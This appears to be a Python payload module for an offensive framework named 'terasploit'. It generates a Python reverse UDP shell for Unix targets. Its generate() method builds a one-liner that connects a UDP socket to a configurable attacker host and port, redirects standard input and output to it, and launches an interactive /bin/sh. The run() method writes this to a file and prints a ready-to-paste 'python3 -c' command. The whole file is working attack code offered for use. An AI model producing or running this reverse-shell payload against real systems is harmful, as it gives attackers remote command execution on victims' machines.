#######
# Module/Payload: Reverse UDP
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.payload import *

class TerasploitModule(Payload):
    
    def initialize(self,info_only: bool = False) -> None:
        update_info(
            {    
                'Name'           : 'ReverseUDP PYTHON',
                'Module'         : Module.payload,
                'Arch'           : Arch.CMD,
                'Platform'       : Platform.UNIX,
                'PayloadHandler' : PayloadHandler.REVERSE_UDP,
                'Author'  : [
                    'Charlie <rupture6.dev[at]gmail.com>'
                ],
                'Description' : [
                    'Generates PYTHON reverse UDP shell'
                ],
                
            }
        )
        
        if info_only:
            return

        register_option ("payload",opt=[
            OptIP.new("lhost",["","yes","target listening address"]),
            OptPort.new("lport",[4444,"yes","target listening port"])
        ])


    def run(self) -> tuple[str, bool]: 
        info_print (f'Generating shell...')
        self.generate_file("shell",Extension.PYTHON,self.generate())
        print ('----' + '\n' + f'python3 -c "{self.generate()}"' + '\n' + '----')
        return 'done', True
    
    
    def generate(self):
        lhost, lport = self.OPT()
        raw_shell: str = (
            f"import socket,subprocess,os;host=\"{lhost}\";port={lport};s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((host,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])"
        )
        
        return raw_shell